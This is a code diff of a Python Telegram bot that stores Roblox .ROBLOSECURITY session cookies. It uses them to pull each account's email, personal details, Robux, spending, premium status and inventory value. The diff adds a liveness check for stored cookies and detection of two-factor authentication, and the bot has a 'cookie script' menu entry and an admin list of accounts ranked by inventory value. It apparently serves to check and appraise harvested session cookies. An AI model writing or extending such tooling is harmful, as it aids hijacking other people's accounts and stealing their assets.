@@ -10,6 +10,7 @@ import logging
 import inspect
 from datetime import datetime
 
+
 # --- Helper: fetch spending live (no cache) ---
 async def _fetch_spending_live(enc_cookie: str, roblox_id: int, limit: int = 250):
     from config import CFG
@@ -33,7 +34,7 @@ from aiogram.filters import StateFilter
 
 from i18n import t, tr, get_user_lang, set_user_lang, set_current_lang
 from aiogram.filters import CommandStart, Command
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, InputMediaPhoto
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, InputMediaPhoto, BufferedInputFile
 
 ADMINS = set((int(x) for x in os.getenv('ADMINS', '').replace(',', ' ').split() if x))
 
@@ -64,6 +65,7 @@ def _invlog(event: str, **kw):
             logging.getLogger("handlers").warning(f"[invlog fail] {e}")
         except Exception:
             pass
+
 
 def get_profile_mem(tg_id, acc_id):
     import time
@@ -220,6 +222,7 @@ async def _ensure_lang_for_user_id(user_id: int, fallback: str = 'en') -> str:
     set_current_lang(lang)
     return lang
 
+
 def _patch_aiogram_message_methods():
     # Monkey-patch aiogram methods to always set user's lang
     from aiogram.types import Message, CallbackQuery
@@ -335,8 +338,10 @@ def _patch_aiogram_message_methods():
         Bot.edit_message_media = _wrap_bot_edit_message_media
         Bot._rbx_lang_patch_done = True
 
+
 # Перезапустите патчинг
 _patch_aiogram_message_methods()
+
 
 async def force_set_user_lang(user_id: int) -> str:
     """Принудительно устанавливает язык пользователя в контекст"""
@@ -348,6 +353,7 @@ async def force_set_user_lang(user_id: int) -> str:
     set_current_lang(lang)
     return lang
 
+
 # === Public info helpers ===
 async def _set_public_pending(tg_id: int, flag: bool, ttl: int = 600):
     try:
@@ -355,14 +361,13 @@ async def _set_public_pending(tg_id: int, flag: bool, ttl: int = 600):
     except Exception:
         pass
 
+
 async def _is_public_pending(tg_id: int) -> bool:
     try:
         v = await storage.get_cached_data(tg_id, 'await_public_id')
         return bool(int(v or 0))
     except Exception:
         return False
-
-
 
 
 def L(key: str, **kw) -> str:
@@ -401,7 +406,7 @@ def _mask_email(email: str) -> str:
 
 
 def render_profile_text_i18n(*, uname, dname, roblox_id, created, country, gender_raw, birthdate, age, email,
-                             email_verified, robux, spent_val, banned) -> str:
+                             email_verified, email_2fa=False, robux, spent_val, banned) -> str:
     # ДЕБАГ
     current_lang = _CURRENT_LANG.get()
     print(f"🔍 render_profile_text_i18n using language: {current_lang}")
@@ -427,7 +432,8 @@ def render_profile_text_i18n(*, uname, dname, roblox_id, created, country, gende
                  birthday=birthdate or L('common.dash'),
                  age=age if age not in (None, '') else L('common.dash'),
                  email=_mask_email(email),
-                 email_verified=L('common.yes') if email_verified else L('common.no'),
+                 email_verified='✅' if email_verified else '❌',
+                 email_2fa='✅' if email_2fa else '❌',
                  robux=robux,
                  spent=spent_val if isinstance(spent_val, (int, float)) and spent_val >= 0 else L('common.dash'),
                  status=L(f'common.{skey}'))
@@ -443,7 +449,8 @@ def render_profile_text_i18n(*, uname, dname, roblox_id, created, country, gende
                  birthday=birthdate or L('common.dash'),
                  age=age if age not in (None, '') else L('common.dash'),
                  email=_mask_email(email),
-                 email_verified=(L('common.yes') if email_verified else L('common.no')),
+                 email_verified=('✅' if email_verified else '❌'),
+                 email_2fa='✅' if email_2fa else '❌',
                  robux=f"{robux} R$",
                  spent=(
                      f"{spent_val} R$" if isinstance(spent_val, (int, float)) and spent_val >= 0 else L('common.dash')),
@@ -577,9 +584,9 @@ def _build_cat_kb_with_prefix(selected: set[str], roblox_id: int, prefix: str) -
 def _build_cat_kb(selected: set[str], roblox_id: int) -> InlineKeyboardMarkup:
     return _build_cat_kb_with_prefix(selected, roblox_id, 'inv_cfg')
 
+
 def _build_cat_kb_public(selected: set[str], roblox_id: int) -> InlineKeyboardMarkup:
     return _build_cat_kb_with_prefix(selected, roblox_id, 'inv_pub_cfg')
-
 
 
 def clean_cookie_value(cookie_value: str) -> str:
@@ -592,10 +599,12 @@ def clean_cookie_value(cookie_value: str) -> str:
         cleaned = cleaned.replace(pat, '')
     return cleaned.strip()
 
+
 def kb_only_back() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=LL('buttons.back', 'btn.back'), callback_data='menu:home')]
     ])
+
 
 async def validate_and_clean_cookie(cookie_value: str) -> Tuple[bool, Optional[str], Optional[Dict[str, Any]]]:
     """
@@ -616,6 +625,18 @@ async def validate_and_clean_cookie(cookie_value: str) -> Tuple[bool, Optional[s
         logger.error(f'{L("errors.generic", err=str(e))}')
         return (False, None, None)
 
+async def _cookie_alive(cookie: str) -> bool:
+    try:
+        import httpx
+        headers = {'User-Agent': 'Mozilla/5.0', 'Referer': 'https://www.roblox.com/',
+                   'Cookie': f'.ROBLOSECURITY={cookie}'}
+        async with httpx.AsyncClient(timeout=15.0) as c:
+            r = await c.get('https://users.roblox.com/v1/users/authenticated', headers=headers)
+            return r.status_code == 200
+    except Exception:
+        return False
+
+
 
 async def edit_or_send(message: types.Message, text: str, reply_markup: Optional[InlineKeyboardMarkup] = None,
                        photo: Optional[FSInputFile] = None, parse_mode: str = 'HTML',
@@ -633,32 +654,34 @@ async def edit_or_send(message: types.Message, text: str, reply_markup: Optional
             except Exception as e:
                 logger.debug(f'edit_media fallback -> answer_photo: {e}')
                 return await message.answer_photo(photo, caption=text, reply_markup=reply_markup,
-                                                 parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
+                                                  parse_mode=parse_mode,
+                                                  disable_web_page_preview=disable_web_page_preview)
         else:
             try:
                 await message.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode,
-                                       disable_web_page_preview=disable_web_page_preview)  # ← ДОБАВЬТЕ ЗДЕСЬ
+                                        disable_web_page_preview=disable_web_page_preview)  # ← ДОБАВЬТЕ ЗДЕСЬ
                 return message
             except Exception as e:
                 logger.debug(f'edit_text fallback -> answer: {e}')
                 return await message.answer(text, reply_markup=reply_markup, parse_mode=parse_mode,
-                                           disable_web_page_preview=disable_web_page_preview)  # ← И ЗДЕСЬ
+                                            disable_web_page_preview=disable_web_page_preview)  # ← И ЗДЕСЬ
     except Exception as e:
         logger.warning(f'edit_or_send failed: {e}')
         return await message.answer(text, reply_markup=reply_markup, parse_mode=parse_mode,
-                                   disable_web_page_preview=disable_web_page_preview)  # ← И ЗДЕСЬ
+                                    disable_web_page_preview=disable_web_page_preview)  # ← И ЗДЕСЬ
 
 
 def kb_main() -> InlineKeyboardMarkup:
     rows = [
-        [InlineKeyboardButton(text=L('menu.add_accounts'),    callback_data='menu:add'),
-         InlineKeyboardButton(text=L('menu.saved_accounts'),  callback_data='menu:accounts')],
-        [InlineKeyboardButton(text=L('menu.public_info'),     callback_data='menu:public'),
-         InlineKeyboardButton(text=L('menu.delete_account'),  callback_data='menu:delete')],
-        [InlineKeyboardButton(text=L('menu.cookie_script'),   callback_data='menu:script')],
-        [InlineKeyboardButton(text=L('menu.settings'),        callback_data='menu:settings')],
+        [InlineKeyboardButton(text=L('menu.add_accounts'), callback_data='menu:add'),
+         InlineKeyboardButton(text=L('menu.saved_accounts'), callback_data='menu:accounts')],
+        [InlineKeyboardButton(text=L('menu.public_info'), callback_data='menu:public'),
+         InlineKeyboardButton(text=L('menu.delete_account'), callback_data='menu:delete')],
+        [InlineKeyboardButton(text=L('menu.cookie_script'), callback_data='menu:script')],
+        [InlineKeyboardButton(text=L('menu.settings'), callback_data='menu:settings')],
     ]
     return InlineKeyboardMarkup(inline_keyboard=rows)
+
 
 async def kb_main_i18n(tg_id: int) -> InlineKeyboardMarkup:
     try:
@@ -668,6 +691,7 @@ async def kb_main_i18n(tg_id: int) -> InlineKeyboardMarkup:
     _CURRENT_LANG.set(lang)
     return kb_main()
 
+
 def kb_settings() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=L('btn.lang'),
@@ -675,6 +699,7 @@ def kb_settings() -> InlineKeyboardMarkup:
         [InlineKeyboardButton(text=LL('buttons.home', 'btn.back'),
                               callback_data='menu:home')]
     ])
+
 
 @router.callback_query(F.data == 'menu:settings')
 async def cb_settings(call: types.CallbackQuery) -> None:
@@ -688,6 +713,8 @@ async def cb_settings(call: types.CallbackQuery) -> None:
         L('settings.title'),
         reply_markup=kb_settings()
     )
+
+
 def _lbl(key: str, fallback: str) -> str:
     v = L(key)
     # если перевода нет — подставляем читаемый текст
@@ -719,6 +746,8 @@ def kb_navigation(roblox_id: int) -> InlineKeyboardMarkup:
             callback_data='menu:home'
         )],
     ])
+
+
 def _kb_category_footer(roblox_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=LL('buttons.all_items', 'btn.auto_da5b332518'),
@@ -823,6 +852,7 @@ async def _get_inventory_cached(tg_id: int, roblox_id: int, force_refresh: bool 
     # If we reached here — most likely private
     return {'byCategory': {}}
 
+
 def _asset_or_none(name: str) -> Optional[FSInputFile]:
     """Менюшные картинки отключены: всегда возвращаем None."""
     return None
@@ -859,7 +889,6 @@ async def cb_home(call: types.CallbackQuery) -> None:
     tg = call.from_user.id
     await edit_or_send(call.message, text, reply_markup=await kb_main_i18n(tg), photo=photo,
                        parse_mode="HTML", disable_web_page_preview=True)  # ← ДОБАВЬТЕ ЭТО
-
 
 
 @router.callback_query(F.data == 'menu:public')
@@ -1026,20 +1055,15 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
     except Exception:
         pass
 
-    # СИЛЬНАЯ установка языка
     tg = call.from_user.id
-
-
-    # ДЕБАГ
-
     roblox_id = int(call.data.split(':', 1)[1])
+
     invalidate_profile_mem(tg, roblox_id)
 
     # ---------- FAST PATH: cache first ----------
     lang = _CURRENT_LANG.get()
     print(f"🔍 Using language: {lang} for profile generation")
 
-    # try our new mem cache
     rec = _profile_mem_get2(tg, roblox_id, lang)
     if isinstance(rec, dict) and rec.get("text"):
         print(f"🔍 Using cached profile with lang: {lang}")
@@ -1052,30 +1076,52 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
         except Exception:
             await call.message.answer(rec["text"], reply_markup=kb_navigation(roblox_id))
         return
-    # try existing project mem cache if present
+
+    # один лоадер, дальше всегда редактируем его
     loader = await call.message.answer(LL('status.loading_profile', 'msg.auto_cefe60da21'))
+
     try:
-        # ЗАЩИТА ЯЗЫКА ПЕРЕД НАЧАЛОМ ЗАГРУЗКИ ПРОФИЛЯ
+        # защита языка перед началом
         await protect_language(call.from_user.id)
 
         enc = await storage.get_encrypted_cookie(tg, roblox_id)
         if not enc:
-            await edit_or_send(call.message, L('msg.auto_e4d1ae989d'),
-                               reply_markup=await kb_main_i18n(tg))
+            try:
+                await loader.edit_text(L('msg.auto_e4d1ae989d'), reply_markup=await kb_main_i18n(tg))
+            except Exception:
+                await call.message.answer(L('msg.auto_e4d1ae989d'), reply_markup=await kb_main_i18n(tg))
             return
+
         cookie = decrypt_text(enc)
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Cookie': f'.ROBLOSECURITY={cookie}',
-                   'Referer': 'https://www.roblox.com/'}
+
+        # preflight: кука живая?
+        if not await _cookie_alive(cookie):
+            try:
+                await loader.edit_text(L('msg.cookie_dead'), reply_markup=await kb_main_i18n(tg))
+            except Exception:
+                await call.message.answer(L('msg.cookie_dead'), reply_markup=await kb_main_i18n(tg))
+            return
+
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+            'Cookie': f'.ROBLOSECURITY={cookie}',
+            'Referer': 'https://www.roblox.com/'
+        }
+
         async with httpx.AsyncClient(timeout=20.0) as c:
-            # ЗАЩИТА ПЕРЕД КАЖДЫМ ВАЖНЫМ ВЫЗОВОМ
+            # защита перед каждым важным вызовом
             await protect_language(call.from_user.id)
+
             u = await c.get(f'https://users.roblox.com/v1/users/{roblox_id}', headers=headers)
             if u.status_code != 200:
-                await edit_or_send(call.message, L('err.profile_load'), reply_markup=await kb_main_i18n(tg))
+                try:
+                    await loader.edit_text(L('err.profile_load'), reply_markup=await kb_main_i18n(tg))
+                except Exception:
+                    await call.message.answer(L('err.profile_load'), reply_markup=await kb_main_i18n(tg))
                 return
             user = u.json()
 
-            # ЗАЩИТА ПЕРЕД ОБРАБОТКОЙ ДАННЫХ
+            # защита перед обработкой данных
             await protect_language(call.from_user.id)
             uname = html.escape(user.get('name', L('common.dash')))
             dname = html.escape(user.get('displayName', L('common.dash')))
@@ -1085,8 +1131,7 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
             country = await storage.get_cached_data(roblox_id, 'acc_country_v1')
             if country is None:
                 await protect_language(call.from_user.id)
-                r = await c.get('https://accountsettings.roblox.com/v1/account/settings/account-country',
-                                headers=headers)
+                r = await c.get('https://accountsettings.roblox.com/v1/account/settings/account-country', headers=headers)
                 country = L('common.dash')
                 if r.status_code == 200:
                     v = (r.json() or {}).get('value', {})
@@ -1099,17 +1144,53 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
                 email_data = await storage.get_cached_data(roblox_id, 'acc_email_v1')
             if not isinstance(email_data, dict):
                 await protect_language(call.from_user.id)
-                email, email_verified = (L('common.dash'), False)
+                email, email_verified, email_2fa = (L('common.dash'), False, False)
                 r = await c.get('https://accountsettings.roblox.com/v1/email', headers=headers)
                 if r.status_code == 200:
                     ej = r.json() or {}
                     email = ej.get('email') or ej.get('emailAddress') or ej.get('contactEmail') or L('common.dash')
                     email_verified = bool(ej.get('verified') or ej.get('isVerified'))
-                await storage.set_cached_data(roblox_id, 'acc_email_v1', {'email': email, 'verified': email_verified},
-                                              24 * 60)
+                # 2FA (best-effort)
+                try:
+                    r2 = await c.get('https://accountsettings.roblox.com/v1/account/settings', headers=headers)
+                    if r2.status_code == 200:
+                        j2 = r2.json() or {}
+                        if isinstance(j2, dict):
+                            if j2.get('twoFactorEnabled') or j2.get('twoStepVerificationEnabled') or j2.get('isTwoStepVerificationEnabled'):
+                                email_2fa = True
+                            else:
+                                for key in ('value', 'values', 'settings'):
+                                    v = j2.get(key)
+                                    if isinstance(v, dict):
+                                        val = v.get('isEnabled') or v.get('enabled') or v.get('value')
+                                        name = (v.get('name') or v.get('key') or '').lower()
+                                        if 'two' in name and str(val).lower() in ('true', '1', 'yes', 'on'):
+                                            email_2fa = True
+                                            break
+                                    elif isinstance(v, list):
+                                        for it in v:
+                                            try:
+                                                name = (it.get('name') or it.get('key') or '').lower()
+                                                val = it.get('isEnabled') or it.get('enabled') or it.get('value')
+                                                if 'two' in name and str(val).lower() in ('true', '1', 'yes', 'on'):
+                                                    email_2fa = True
+                                                    break
+                                            except:
+                                                continue
+                                        else:
+                                            pass
+                except Exception:
+                    pass
+
+                await storage.set_cached_data(
+                    roblox_id, 'acc_email_v1',
+                    {'email': email, 'verified': email_verified, 'twofa': bool(email_2fa)},
+                    24 * 60
+                )
             else:
                 email = email_data.get('email', L('common.dash'))
                 email_verified = email_data.get('verified', False)
+                email_2fa = email_data.get('twofa', False)
 
             gender = await storage.get_cached_data(roblox_id, 'acc_gender_v1')
             if gender is None:
@@ -1152,8 +1233,10 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
             if cached is None:
                 try:
                     import asyncio
-                    spent_val = await asyncio.wait_for(roblox_client.get_total_spent_robux(roblox_id, cookie),
-                                                       timeout=1.5)
+                    spent_val = await asyncio.wait_for(
+                        roblox_client.get_total_spent_robux(roblox_id, cookie),
+                        timeout=1.5
+                    )
                     await storage.set_cached_data(roblox_id, 'acc_spent_robux_v1', int(spent_val), 300)
                 except Exception:
                     spent_val = -1
@@ -1166,7 +1249,7 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
                             pass
 
                     try:
-                        import asyncio as _a;
+                        import asyncio as _a
                         _a.create_task(_warm())
                     except Exception:
                         pass
@@ -1177,12 +1260,10 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
             if premium is None:
                 await protect_language(call.from_user.id)
                 premium = L('common.regular')
-                r = await c.get(f'https://premiumfeatures.roblox.com/v1/users/{roblox_id}/validate-membership',
-                                headers=headers)
+                r = await c.get(f'https://premiumfeatures.roblox.com/v1/users/{roblox_id}/validate-membership', headers=headers)
                 if r.status_code == 200:
                     pj = r.json()
-                    if isinstance(pj, bool) and pj or (isinstance(pj, dict) and (
-                            pj.get('isPremium') or pj.get('hasMembership') or pj.get('premium'))):
+                    if (isinstance(pj, bool) and pj) or (isinstance(pj, dict) and (pj.get('isPremium') or pj.get('hasMembership') or pj.get('premium'))):
                         premium = L('common.premium')
                 await storage.set_cached_data(roblox_id, 'acc_premium_v1', premium, 60)
 
@@ -1192,14 +1273,16 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
                 avatar_url = None
                 ra = await c.get(
                     f'https://thumbnails.roblox.com/v1/users/avatar?userIds={roblox_id}&size=420x420&format=Png&isCircular=false',
-                    headers=headers)
+                    headers=headers
+                )
                 if ra.status_code == 200 and (ra.json() or {}).get('data'):
                     avatar_url = ra.json()['data'][0].get('imageUrl')
                 await storage.set_cached_data(roblox_id, 'acc_avatar_v1', avatar_url, 60)
 
-        # ЗАЩИТА ПЕРЕД ФИНАЛЬНОЙ ГЕНЕРАЦИЕЙ ТЕКСТА
+        # финальная защита и рендер
         await protect_language(call.from_user.id)
         status = L('common.active') if not banned else L('common.banned')
+
         socials = await storage.get_cached_data(roblox_id, 'acc_socials_v1')
         if not isinstance(socials, dict):
             try:
@@ -1208,45 +1291,50 @@ async def cb_show_account(call: types.CallbackQuery) -> None:
                 socials = {}
             await storage.set_cached_data(roblox_id, 'acc_socials_v1', socials, 24 * 60)
 
-        # ФИНАЛЬНАЯ ЗАЩИТА ПЕРЕД render_profile_text_i18n
         await protect_language(call.from_user.id)
         text = render_profile_text_i18n(
-            uname=uname,
-            dname=dname,
-            roblox_id=roblox_id,
-            created=created,
-            country=country,
-            gender_raw=gender,
-            birthdate=birthdate,
-            age=age,
-            email=email,
-            email_verified=email_verified,
-            robux=robux,
-            spent_val=spent_val,
-            banned=banned,
+            uname=uname, dname=dname, roblox_id=roblox_id, created=created,
+            country=country, gender_raw=gender, birthdate=birthdate, age=age,
+            email=email, email_verified=email_verified, email_2fa=email_2fa,
+            robux=robux, spent_val=spent_val, banned=banned,
         )
 
-        try:
-            await loader.delete()
-        except Exception:
-            pass
+        # выводим финал:
         if avatar_url:
+            try:
+                await loader.delete()
+            except Exception:
+                pass
             async with httpx.AsyncClient(timeout=20.0) as c:
                 im = await c.get(avatar_url)
                 if im.status_code == 200:
                     path = f'temp/avatar_{roblox_id}.png'
+                    os.makedirs('temp', exist_ok=True)
                     open(path, 'wb').write(im.content)
-                    await edit_or_send(call.message, text, reply_markup=kb_navigation(roblox_id),
-                                       photo=FSInputFile(path))
+                    await call.message.answer_photo(FSInputFile(path), caption=text, reply_markup=kb_navigation(roblox_id))
                     try:
                         os.remove(path)
                     except Exception:
                         pass
                     return
-        await edit_or_send(call.message, text, reply_markup=kb_navigation(roblox_id))
+            # если аватар не скачался — редактим лоадер текстом
+            await loader.edit_text(text, reply_markup=kb_navigation(roblox_id))
+        else:
+            await loader.edit_text(text, reply_markup=kb_navigation(roblox_id))
+
+        # кеш на будущее
+        try:
+            _profile_mem_set2(tg, roblox_id, lang, text=text, photo_id=None)
+        except Exception:
+            pass
+
     except Exception as e:
         logger.error(f'acct view error {roblox_id}: {e}')
-        await edit_or_send(call.message, L("err.profile_load"), reply_markup=await kb_main_i18n(tg))
+        try:
+            await loader.edit_text(L("err.profile_load"), reply_markup=await kb_main_i18n(tg))
+        except Exception:
+            pass
+
 
 
 from typing import Dict, List, Any, Tuple
@@ -1294,13 +1382,13 @@ def _kb_categories_only(roblox_id: int, by_cat: Dict[str, List[Dict[str, Any]]])
         nz = _filter_nonzero(items)
         if not nz:
             continue
-        rows.append([InlineKeyboardButton(text=f'{cat} — {len(nz)} {L("common.pcs")} · {_sum_items(nz):,} {RICON}'.replace(',', ' '),
-                                          callback_data=f'invcat:{roblox_id}:{_short_name(roblox_id, cat)}')])
+        rows.append([InlineKeyboardButton(
+            text=f'{cat} — {len(nz)} {L("common.pcs")} · {_sum_items(nz):,} {RICON}'.replace(',', ' '),
+            callback_data=f'invcat:{roblox_id}:{_short_name(roblox_id, cat)}')])
     rows.append([InlineKeyboardButton(text=LL('buttons.refresh', 'btn.refresh'),
                                       callback_data=f'invall_refresh:{roblox_id}')])
     rows.append([InlineKeyboardButton(text=LL('buttons.home', 'btn.back'), callback_data='menu:home')])
     return InlineKeyboardMarkup(inline_keyboard=rows)
-
 
 
 def _likely_private_inventory(err: Exception) -> bool:
@@ -1571,7 +1659,8 @@ async def cb_inventory_category(call: types.CallbackQuery) -> None:
             return
 
         await protect_language(call.from_user.id)
-        img_bytes = await generate_category_sheets(tg, roblox_id, full, limit=0, username=call.from_user.username, items_override=items)
+        img_bytes = await generate_category_sheets(tg, roblox_id, full, limit=0, username=call.from_user.username,
+                                                   items_override=items)
         if not img_bytes:
             img_bytes = await generate_full_inventory_grid(items, tile=150, pad=6, username=call.from_user.username,
                                                            user_id=call.from_user.id)
@@ -1952,7 +2041,8 @@ async def cmd_user_snapshot(msg: types.Message):
     if not sn:
         await msg.answer(L('msg.auto_92248ed4b0'))
         return
-    await msg.answer(L('admin.user_snapshot', rid=rid, inventory_val=sn['inventory_val'], total_spent=sn['total_spent'], updated_at=sn['updated_at']), parse_mode='HTML')
+    await msg.answer(L('admin.user_snapshot', rid=rid, inventory_val=sn['inventory_val'], total_spent=sn['total_spent'],
+                       updated_at=sn['updated_at']), parse_mode='HTML')
 
 
 from aiogram import types, F
@@ -2239,7 +2329,6 @@ _LANG_NAMES = {
 }
 
 
-
 def _lang_label(code: str) -> str:
     return _LANG_NAMES.get(code, code.upper())
 
@@ -2302,6 +2391,7 @@ async def debug_lang(context: str, user_id: int):
     except Exception as e:
         print(f"🔍 LANG DEBUG ERROR [{context}]: {e}")
 
+
 async def force_set_user_lang(user_id: int) -> str:
     """Принудительно устанавливает язык пользователя в контекст"""
     try:
@@ -2311,6 +2401,7 @@ async def force_set_user_lang(user_id: int) -> str:
     _CURRENT_LANG.set(lang)
     set_current_lang(lang)
     return lang
+
 
 def _patch_aiogram_message_methods():
     # Monkey-patch aiogram methods to always set user's lang
@@ -2401,8 +2492,10 @@ def _patch_aiogram_message_methods():
         Bot.edit_message_media = _wrap_bot_edit_message_media
         Bot._rbx_lang_patch_done = True
 
+
 # Перезапустите патчинг
 _patch_aiogram_message_methods()
+
 
 @router.message(F.text.regexp(r'^\d{5,}$'))
 async def handle_public_id(message: types.Message) -> None:
@@ -2442,14 +2535,15 @@ async def handle_public_id(message: types.Message) -> None:
             card = render_profile_text_i18n(
                 uname=uname, dname=dname, roblox_id=rid, created=created,
                 country=country, gender_raw=gender, birthdate=birthdate, age=age,
-                email=email, email_verified=email_verified, robux=robux,
+                email=email, email_verified=email_verified, email_2fa=False, robux=robux,
                 spent_val=spent_val, banned=banned
             )
             text = f"{note}\n\n{card}"
 
             # Avatar via thumbnails (no cookie)
             avatar_url = None
-            tr = await c.get(f'https://thumbnails.roblox.com/v1/users/avatar?userIds={rid}&size=420x420&format=Png&isCircular=false')
+            tr = await c.get(
+                f'https://thumbnails.roblox.com/v1/users/avatar?userIds={rid}&size=420x420&format=Png&isCircular=false')
             if tr.status_code == 200 and (tr.json() or {}).get('data'):
                 avatar_url = tr.json()['data'][0].get('imageUrl')
 
@@ -2460,8 +2554,10 @@ async def handle_public_id(message: types.Message) -> None:
                     os.makedirs('temp', exist_ok=True)
                     open(path, 'wb').write(im.content)
                     await edit_or_send(message, text, reply_markup=kb_public_navigation(rid), photo=FSInputFile(path))
-                    try: os.remove(path)
-                    except Exception: pass
+                    try:
+                        os.remove(path)
+                    except Exception:
+                        pass
                     return
 
             await edit_or_send(message, text, reply_markup=kb_public_navigation(rid))
@@ -2507,6 +2603,7 @@ async def cmd_test_profile_text(msg: types.Message):
 
     await msg.answer(f"🔍 ТЕСТ ПЕРЕВОДА PROFILE.CARD:\n\n{test_text}")
 
+
 async def protect_language(user_id: int):
     """Глобальная защита языка - вызывает принудительную установку языка перед ЛЮБОЙ операцией"""
     try:
@@ -2519,6 +2616,7 @@ async def protect_language(user_id: int):
         _CURRENT_LANG.set('en')
         set_current_lang('en')
 
+
 # === Explicit inventory fetchers (strict) ===
 async def _get_inventory_private_only(tg_id: int, roblox_id: int) -> dict:
     await protect_language(tg_id)
@@ -2529,6 +2627,7 @@ async def _get_inventory_private_only(tg_id: int, roblox_id: int) -> dict:
     except Exception:
         pass
     return {'byCategory': {}}
+
 
 async def _get_inventory_public_only(roblox_id: int) -> dict:
     try:
@@ -2553,7 +2652,6 @@ async def cb_inv_pub_cfg_open(call: types.CallbackQuery):
     await _set_selected_cats(tg, roblox_id, selected)
     await call.message.answer(LL('messages.choose_categories', 'msg.auto_6f2eded9fa'),
                               reply_markup=_build_cat_kb_public(selected, roblox_id))
-
 
 
 @router.callback_query(F.data.regexp('^inv_pub_cfg_next:\\d+$'))
@@ -2581,7 +2679,8 @@ async def cb_inv_pub_cfg_next(call: types.CallbackQuery):
         # ✅ Логируем публичную проверку, чтобы она считалась в /stat
         await storage.log_event('check', telegram_id=tg, roblox_id=roblox_id)
 
-        logger.info(f"[inv_pub_cfg_next] got inventory keys={list(data.keys()) if isinstance(data, dict) else type(data)}")
+        logger.info(
+            f"[inv_pub_cfg_next] got inventory keys={list(data.keys()) if isinstance(data, dict) else type(data)}")
 
         await protect_language(call.from_user.id)
         by_cat = _merge_categories(data.get('byCategory', {}) or {})
@@ -2762,7 +2861,6 @@ _LANG_NAMES = {
 }
 
 
-
 def _lang_label(code: str) -> str:
     return _LANG_NAMES.get(code, code.upper())
 
@@ -2774,7 +2872,6 @@ async def _kb_lang_list(user_lang: str) -> InlineKeyboardMarkup:
         rows.append([InlineKeyboardButton(text=f'{mark}{_lang_label(code)}', callback_data=f'lang:set:{code}')])
     rows.append([InlineKeyboardButton(text=LL('buttons.back', 'btn.back') or '⬅️ Back', callback_data='menu:home')])
     return InlineKeyboardMarkup(inline_keyboard=rows)
-
 
 
 @router.callback_query(F.data.regexp('^inv_pub_cfg_toggle:\\d+:.+$'))
@@ -2801,7 +2898,6 @@ async def cb_inv_pub_cfg_toggle(call: types.CallbackQuery):
             raise
 
 
-
 @router.callback_query(F.data.regexp('^inv_pub_cfg_allon:\\d+$'))
 async def cb_inv_pub_cfg_allon(call: types.CallbackQuery):
     await protect_language(call.from_user.id)
@@ -2821,7 +2917,6 @@ async def cb_inv_pub_cfg_allon(call: types.CallbackQuery):
             raise
 
 
-
 @router.callback_query(F.data.regexp('^inv_pub_cfg_alloff:\\d+$'))
 async def cb_inv_pub_cfg_alloff(call: types.CallbackQuery):
     await protect_language(call.from_user.id)
@@ -2838,8 +2933,6 @@ async def cb_inv_pub_cfg_alloff(call: types.CallbackQuery):
     except TelegramBadRequest as e:
         if 'message is not modified' not in str(e):
             raise
-
-
 
 
 async def _send_full_inventory_paged(*, message, items, tg_id: int, roblox_id: int,
@@ -2899,7 +2992,8 @@ async def _send_full_inventory_paged(*, message, items, tg_id: int, roblox_id: i
         except TelegramBadRequest as e:
             logger.info(f"[paged] photo fail page={i}/{total} err={e} size={w}x{h} bytes={b}")
             # Fallback to document for this page
-            await message.answer_document(FSInputFile(path), caption=cap_text, reply_markup=(kb_first if i == 1 else None))
+            await message.answer_document(FSInputFile(path), caption=cap_text,
+                                          reply_markup=(kb_first if i == 1 else None))
             logger.info(f"[paged] document ok page={i}/{total} size={w}x{h} bytes={b}")
         finally:
             try:
@@ -2916,10 +3010,6 @@ def _admin_dbg(msg):
         logger.info("[admin-cb] %s", msg)
     except Exception:
         pass
-
-
-
-
 
 
 @router.callback_query(F.data == "admin:stats")
@@ -2951,16 +3041,14 @@ async def _admin_stats_btn(cb: types.CallbackQuery, state: FSMContext):
         await cb.message.answer(text, parse_mode="HTML", reply_markup=kb_admin_main())
 
 
-
-
 USERS_PER_PAGE = 5
+
 
 def _fmt_price(v: int) -> str:
     try:
         return f"{int(v):,}".replace(",", " ")
     except Exception:
         return str(v)
-
 
 
 @router.callback_query(F.data.regexp(r'^admin:users:(\d+)$'))
@@ -2995,7 +3083,7 @@ async def _admin_users_btn(cb: types.CallbackQuery, state: FSMContext):
     total = len(accounts)
     per_page = USERS_PER_PAGE
     start = page * per_page
-    chunk = accounts[start:start+per_page]
+    chunk = accounts[start:start + per_page]
 
     from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
     kb_rows = []
@@ -3003,24 +3091,27 @@ async def _admin_users_btn(cb: types.CallbackQuery, state: FSMContext):
         rid = int(it["roblox_id"])
         name = it.get("username") or f"ID {rid}"
         price = int(it.get("inventory_val") or 0)
-        kb_rows.append([InlineKeyboardButton(text=f"{name} — {_fmt_price(price)} RBX", callback_data=f"admin:user:{rid}")])
+        kb_rows.append(
+            [InlineKeyboardButton(text=f"{name} — {_fmt_price(price)} RBX", callback_data=f"admin:user:{rid}")])
 
     nav = []
     if page > 0:
-        nav.append(InlineKeyboardButton(text='⬅️', callback_data=f'admin:users:{page-1}'))
-    nav.append(InlineKeyboardButton(text=f'{page+1}', callback_data='noop'))
-    if (page+1)*per_page < total:
-        nav.append(InlineKeyboardButton(text='➡️', callback_data=f'admin:users:{page+1}'))
+        nav.append(InlineKeyboardButton(text='⬅️', callback_data=f'admin:users:{page - 1}'))
+    nav.append(InlineKeyboardButton(text=f'{page + 1}', callback_data='noop'))
+    if (page + 1) * per_page < total:
+        nav.append(InlineKeyboardButton(text='➡️', callback_data=f'admin:users:{page + 1}'))
     if nav:
         kb_rows.append(nav)
